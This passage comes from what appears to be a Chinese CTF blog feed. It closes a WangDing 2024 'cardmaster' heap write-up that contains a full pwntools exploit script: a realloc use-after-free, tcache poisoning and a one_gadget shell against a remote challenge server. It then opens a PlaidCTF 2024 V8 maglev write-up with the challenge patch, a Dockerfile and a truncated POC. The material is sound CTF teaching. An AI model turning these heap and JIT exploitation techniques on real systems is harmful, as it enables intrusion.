&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* realloc of null is supposed to be same as malloc */</span></span><br><span class="line">  <span class="keyword">if</span> (oldmem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (bytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* chunk corresponding to oldmem */</span></span><br><span class="line">  <span class="type">const</span> mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">  <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">const</span> INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (oldp))</span><br><span class="line">    ar_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      MAYBE_INIT_TCACHE ();</span><br><span class="line">      ar_ptr = arena_for_chunk (oldp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the allocator</span></span><br><span class="line"><span class="comment">     never wrapps around at the end of the address space.  Therefore</span></span><br><span class="line"><span class="comment">     we can exclude some size values which might appear here by</span></span><br><span class="line"><span class="comment">     accident or by &quot;design&quot; from some intruder.  We need to bypass</span></span><br><span class="line"><span class="comment">     this check for dumped fake mmap chunks from the old main arena</span></span><br><span class="line"><span class="comment">     because the new malloc may provide additional alignment.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((__builtin_expect ((<span class="type">uintptr_t</span>) oldp &gt; (<span class="type">uintptr_t</span>) -oldsize, <span class="number">0</span>)</span><br><span class="line">       || __builtin_expect (misaligned_chunk (oldp), <span class="number">0</span>))</span><br><span class="line">      &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (oldp))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;realloc(): invalid pointer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (oldp))</span><br><span class="line">    <span class="comment">//本程序用不到mmapped的内存，故省略</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">//单线程</span></span><br><span class="line">    &#123;</span><br><span class="line">      newp = _int_realloc (ar_ptr, oldp, oldsize, nb); <span class="comment">//调用_int_realloc，也是函数的主逻辑所在</span></span><br><span class="line">      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||</span><br><span class="line">	      ar_ptr == arena_for_chunk (mem2chunk (newp)));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> newp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//本程序并非多线程，故省略</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_realloc)</span><br></pre></td></tr></table></figure></div>

<p>看起来很复杂（），主要逻辑就是如果传入的newsize不为0，就调用_int_realloc，为0就调用__libc_free，并返回0。</p>
<p>_int_realloc的主要逻辑就是判断oldsize和newsize的大小关系，然后进行malloc，memcpy，free。</p>
<p>故，我们传入的suit_size为0的话，程序相当于free(a1-&gt;symble)，且因为v5为0，并不会进入到下面的<code>*a1-&gt;symble = v5;</code>，会产生uaf漏洞。</p>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>由于程序只有在symble是默认的时候才会调用malloc，所以需要malloc的时候必须先调用一次init恢复默认。</p>
<p>先是常规的uaf泄露地址</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x80&#x27;</span>)  <span class="comment"># malloc</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;suit chara set:&#x27;</span>)</span><br><span class="line">heap_base = u64_ex(ru(<span class="string">b&#x27;\x0a&#x27;</span>, drop=<span class="literal">True</span>)) - <span class="number">0x640</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line"></span><br><span class="line">sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc_base = u64_ex(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x3EBCA0</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br></pre></td></tr></table></figure></div>

<p>由于在malloc一次后，使用的是realloc，所以通过修改tcache的next指针实现任意分配需要一点手法。</p>
<p>正常来说，uaf实现任意地址分配，首先构造A-&gt;B-&gt;A的链条，先malloc，分配到A，修改next，使链表变成B-&gt;A-&gt;C，C就是想要分配到的地址。</p>
<p>在本题中，如果我们使用malloc分配到A，那么后续都是realloc，比较难以继续利用。因此我们选择利用init里面的</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v0 = (v4[<span class="number">4</span>] + <span class="number">8LL</span> * i);</span><br><span class="line">  *v0 = <span class="built_in">malloc</span>(<span class="number">0xD0</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">12</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    *(*(<span class="number">8LL</span> * i + v4[<span class="number">4</span>]) + <span class="number">16LL</span> * j) = i;</span><br><span class="line">    *(*(<span class="number">8LL</span> * i + v4[<span class="number">4</span>]) + <span class="number">16LL</span> * j + <span class="number">8</span>) = j + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>*v0 = malloc(0xD0uLL);</code>，先伪造一个链表，让tcache里面有4个chunk，这样init后，剩下我们想要分配到的地址，这时候再set，malloc到的就是我们想分配到的那个地址了。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202411/28/WangDing-2024/image-20241128092300960.png"
                      alt="image-20241128092300960"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202411/28/WangDing-2024/image-20241128092325510.png"
                      alt="image-20241128092325510"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202411/28/WangDing-2024/image-20241128092332880.png"
                      alt="image-20241128092332880"
                ></p>
<p>劫持show函数，写入one_gadget即可get shell</p>
<p>贴一个exp</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">rand = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">rand.srand(<span class="number">0xDEADBEEF</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;173.41.149.110 8888&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./cardmaster&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./cardmaster&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    directory /mnt/f/Documents/ctf/glibc/glibc-2.27/malloc</span></span><br><span class="line"><span class="string">     b *$rebase(0xAD8)</span></span><br><span class="line"><span class="string">    # b *$rebase(0xC1A)</span></span><br><span class="line"><span class="string">    # b *$rebase(0xC5F)</span></span><br><span class="line"><span class="string">    # new</span></span><br><span class="line"><span class="string">    b *$rebase(0x1231)</span></span><br><span class="line"><span class="string">    # malloc</span></span><br><span class="line"><span class="string">    b *$rebase(0x1218)</span></span><br><span class="line"><span class="string">    # realloc</span></span><br><span class="line"><span class="string">    b *$rebase(0x137B)</span></span><br><span class="line"><span class="string">    # read</span></span><br><span class="line"><span class="string">    b *$rebase(0xD87)</span></span><br><span class="line"><span class="string">    # show</span></span><br><span class="line"><span class="string">    # b *$rebase(0x10B3)</span></span><br><span class="line"><span class="string">    # show_card</span></span><br><span class="line"><span class="string">    b *$rebase(0x1144)</span></span><br><span class="line"><span class="string">    # ret</span></span><br><span class="line"><span class="string">    # b *$rebase(0xF80)</span></span><br><span class="line"><span class="string">    # b *$rebase(0x105D)</span></span><br><span class="line"><span class="string">    # b *$rebase(0xFB7)</span></span><br><span class="line"><span class="string">    # mov to stack</span></span><br><span class="line"><span class="string">    b *$rebase(0xB10)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">input_after_this = <span class="string">b&#x27;&gt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, range_, level, data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;suit count:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;digit range 1 - ?&#x27;</span>, <span class="built_in">str</span>(range_))</span><br><span class="line">    sla(<span class="string">b&#x27;randomize level:&#x27;</span>, <span class="built_in">str</span>(level))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        sa(<span class="string">b&#x27;new suite set:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shuffle</span>():</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_card</span>():</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;♥♠♦♣&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x80&#x27;</span>)  <span class="comment"># malloc</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;suit chara set:&#x27;</span>)</span><br><span class="line">heap_base = u64_ex(ru(<span class="string">b&#x27;\x0a&#x27;</span>, drop=<span class="literal">True</span>)) - <span class="number">0x640</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line"></span><br><span class="line">sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc_base = u64_ex(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x3EBCA0</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line">fake_heap = heap_base + <span class="number">0x1480</span></span><br><span class="line">sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(</span><br><span class="line">    <span class="number">0x400</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x80</span>: fake_heap + <span class="number">0x170</span>,</span><br><span class="line">            <span class="number">0x170</span>: fake_heap + <span class="number">0x250</span>,</span><br><span class="line">            <span class="number">0x250</span>: heap_base + <span class="number">0x104B8</span>,</span><br><span class="line">            <span class="number">0x330</span>: heap_base + <span class="number">0x100</span>,</span><br><span class="line">            <span class="number">0x410</span>: heap_base + <span class="number">0x100</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">)  <span class="comment"># malloc</span></span><br><span class="line"></span><br><span class="line">sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x34</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># malloc</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x34</span>, <span class="number">1</span>, <span class="number">1</span>, p64_ex(fake_heap + <span class="number">0x80</span>))</span><br><span class="line">sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">add(<span class="number">0x34</span>, <span class="number">1</span>, <span class="number">1</span>, p64_ex(libc_base + <span class="number">0x10A38C</span>))  <span class="comment"># malloc</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>





<p>你问我为什么没有决赛的wp？9分钟题就被秒了，这我打鸡毛（</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>网鼎2024</tag>
      </tags>
  </entry>
  <entry>
    <title>PlaidCTF2024-maglev</title>
    <url>/202503/06/PlaidCTF2024-maglev/</url>
    <content><![CDATA[<h1 id="PlaidCTF2024-maglev"><a href="#PlaidCTF2024-maglev" class="headerlink" title="PlaidCTF2024-maglev"></a>PlaidCTF2024-maglev</h1><div class="code-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">index 585c37b16e1..2dc9cec9d99 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.cc</span></span><br><span class="line"><span class="meta">@@ -3303,6 +3303,7 @@</span> Local&lt;FunctionTemplate&gt; Shell::CreateNodeTemplates(</span><br><span class="line"> </span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span><br><span class="line"><span class="addition">+  if (/* DISABLES CODE */ (false)) &#123;</span></span><br><span class="line">   global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span><br><span class="line">                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;version&quot;,</span><br><span class="line"><span class="meta">@@ -3325,8 +3326,10 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">                        FunctionTemplate::New(isolate, ReadLine));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;load&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, ExecuteFile));</span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line">   global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, SetTimeout));</span><br><span class="line"><span class="addition">+  if (/* DISABLES CODE */ (false)) &#123;</span></span><br><span class="line">   // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line">   // call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span><br><span class="line">   // we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span><br><span class="line"><span class="meta">@@ -3350,7 +3353,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">     global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span><br><span class="line">                          Shell::CreateAsyncHookTemplate(isolate));</span><br><span class="line">   &#125;</span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line">   return global_template;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">diff --git a/src/maglev/maglev-graph-builder.cc b/src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"><span class="comment">index 197dcba916b..aba8eb86354 100644</span></span><br><span class="line"><span class="comment">--- a/src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"><span class="comment">+++ b/src/maglev/maglev-graph-builder.cc</span></span><br><span class="line"><span class="meta">@@ -6835,6 +6835,14 @@</span> ReduceResult MaglevGraphBuilder::TryReduceArrayPrototypePush(</span><br><span class="line">   ValueNode* new_array_length_smi =</span><br><span class="line">       AddNewNode&lt;CheckedSmiIncrement&gt;(&#123;old_array_length_smi&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="addition">+  ValueNode* length_field_smi;</span></span><br><span class="line"><span class="addition">+  GET_VALUE_OR_ABORT(length_field_smi,</span></span><br><span class="line"><span class="addition">+                     GetSmiValue(AddNewNode&lt;LoadTaggedField&gt;(&#123;receiver&#125;,</span></span><br><span class="line"><span class="addition">+                     JSArray::kLengthOffset)));</span></span><br><span class="line"><span class="addition">+  ValueNode* length_field = AddNewNode&lt;UnsafeSmiUntag&gt;(&#123;length_field_smi&#125;);</span></span><br><span class="line"><span class="addition">+  ValueNode* new_length_field_smi =</span></span><br><span class="line"><span class="addition">+      AddNewNode&lt;CheckedSmiIncrement&gt;(&#123;length_field_smi&#125;);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   ValueNode* elements_array = BuildLoadElements(receiver);</span><br><span class="line">   ValueNode* elements_array_length =</span><br><span class="line">       AddNewNode&lt;UnsafeSmiUntag&gt;(&#123;AddNewNode&lt;LoadTaggedField&gt;(</span><br><span class="line"><span class="meta">@@ -6849,17 +6857,16 @@</span> ReduceResult MaglevGraphBuilder::TryReduceArrayPrototypePush(</span><br><span class="line">             &#123;elements_array, receiver, old_array_length, elements_array_length&#125;,</span><br><span class="line">             kind);</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    AddNewNode&lt;StoreTaggedFieldNoWriteBarrier&gt;(&#123;receiver, new_array_length_smi&#125;,</span></span><br><span class="line"><span class="addition">+    AddNewNode&lt;StoreTaggedFieldNoWriteBarrier&gt;(&#123;receiver, new_length_field_smi&#125;,</span></span><br><span class="line">                                                JSArray::kLengthOffset);</span><br><span class="line"> </span><br><span class="line">     // Do the store</span><br><span class="line">     if (IsDoubleElementsKind(kind)) &#123;</span><br><span class="line">       AddNewNode&lt;StoreFixedDoubleArrayElement&gt;(</span><br><span class="line"><span class="deletion">-          &#123;writable_elements_array, old_array_length, value&#125;);</span></span><br><span class="line"><span class="addition">+          &#123;writable_elements_array, length_field, value&#125;);</span></span><br><span class="line">     &#125; else &#123;</span><br><span class="line">       DCHECK(IsSmiElementsKind(kind) || IsObjectElementsKind(kind));</span><br><span class="line"><span class="deletion">-      BuildStoreFixedArrayElement(writable_elements_array, old_array_length,</span></span><br><span class="line"><span class="deletion">-                                  value);</span></span><br><span class="line"><span class="addition">+      BuildStoreFixedArrayElement(writable_elements_array, length_field, value);</span></span><br><span class="line">     &#125;</span><br><span class="line">     return ReduceResult::Done();</span><br><span class="line">   &#125;;</span><br><span class="line"><span class="meta">@@ -6872,7 +6879,7 @@</span> ReduceResult MaglevGraphBuilder::TryReduceArrayPrototypePush(</span><br><span class="line">     sub_graph.Bind(&amp;*do_return);</span><br><span class="line">   &#125;</span><br><span class="line">   RecordKnownProperty(receiver, broker()-&gt;length_string(), new_array_length_smi,</span><br><span class="line"><span class="deletion">-                      false, compiler::AccessMode::kStore);</span></span><br><span class="line"><span class="addition">+                      false, compiler::AccessMode::kLoad);</span></span><br><span class="line">   return new_array_length_smi;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -7042,7 +7049,7 @@</span> ReduceResult MaglevGraphBuilder::TryReduceArrayPrototypePop(</span><br><span class="line">   sub_graph.Bind(&amp;*do_return);</span><br><span class="line">   RecordKnownProperty(receiver, broker()-&gt;length_string(),</span><br><span class="line">                       sub_graph.get(var_new_array_length), false,</span><br><span class="line"><span class="deletion">-                      compiler::AccessMode::kStore);</span></span><br><span class="line"><span class="addition">+                      compiler::AccessMode::kLoad);</span></span><br><span class="line">   return sub_graph.get(var_value);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Dockerfile"><figure class="iseeu highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu@sha256:aa772c98400ef833586d1d517d3e8de670f7e712bf581ce6053165081773259d</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -yq build-essential git wget python3 lsb-release binutils binutils-aarch64-linux-gnu binutils-arm-linux-gnueabihf binutils-mips64el-linux-gnuabi64 binutils-mipsel-linux-gnu bison bzip2 cdbs curl dbus-x11 devscripts dpkg-dev elfutils fakeroot flex git-core gperf lib32z1 libasound2 libasound2-dev libatk1.0-0 libatspi2.0-0 libatspi2.0-dev libbluetooth-dev libbrlapi-dev libbrlapi0.8 libbz2-1.0 libbz2-dev libc6 libc6-dev libcairo2 libcairo2-dev libcap-dev libcap2 libcgi-session-perl libcups2 libcups2-dev libcurl4-gnutls-dev libdrm-dev libdrm2 libegl1 libelf-dev libevdev-dev libevdev2 libexpat1 libffi-dev libffi8 libfontconfig1 libfreetype6 libgbm-dev libgbm1 libgl1 libglib2.0-0 libglib2.0-dev libglu1-mesa-dev libgtk-3-0 libgtk-3-dev libinput-dev libinput10 libjpeg-dev libkrb5-dev libnspr4 libnspr4-dev libnss3 libnss3-dev libpam0g libpam0g-dev libpango-1.0-0 libpangocairo-1.0-0 libpci-dev libpci3 libpcre3 libpixman-1-0 libpng16-16 libpulse-dev libpulse0 libsctp-dev libspeechd-dev libspeechd2 libsqlite3-0 libsqlite3-dev libssl-dev libstdc++6 libsystemd-dev libudev-dev libudev1 libuuid1 libva-dev libvulkan-dev libvulkan1 libwayland-egl1 libwayland-egl1-mesa libwww-perl libx11-6 libx11-xcb1 libxau6 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxdmcp6 libxext6 libxfixes3 libxi6 libxinerama1 libxkbcommon-dev libxrandr2 libxrender1 libxshmfence-dev libxslt1-dev libxss-dev libxt-dev libxtst-dev libxtst6 lighttpd locales mesa-common-dev openbox p7zip patch perl pkg-config rpm ruby subversion uuid-dev wdiff x11-utils xcompmgr xvfb xz-utils zip zlib1g zstd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /build</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span></span><br><span class="line"><span class="keyword">ENV</span> PATH=<span class="string">&quot;/build/depot_tools:$PATH&quot;</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> gclient</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /build/v8</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> diff.patch .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> fetch v8 &amp;&amp; <span class="built_in">cd</span> /build/v8/v8 &amp;&amp; git checkout 8fd9b6c4481babb973bba94decd8e2614669b5e9 &amp;&amp; gclient <span class="built_in">sync</span> -D &amp;&amp; patch -p1 &lt; ../diff.patch &amp;&amp; tools/dev/gm.py x64.release</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;All done.&quot;</span></span></span><br></pre></td></tr></table></figure></div>



<p>漏洞处</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202503/06/PlaidCTF2024-maglev/image-20250306165208864.png"
                      alt="image-20250306165208864"
                ></p>
<p>POC</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> cor_arr;</span><br><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"><span class="keyword">let</span> arr2 = arr;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    cor_arr = [arr, arr];</span><br><span class="line">    arr2.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    arr.<span class="title function_">push</span>(<span class="number">1.1</span>);</span><br><span class="line">    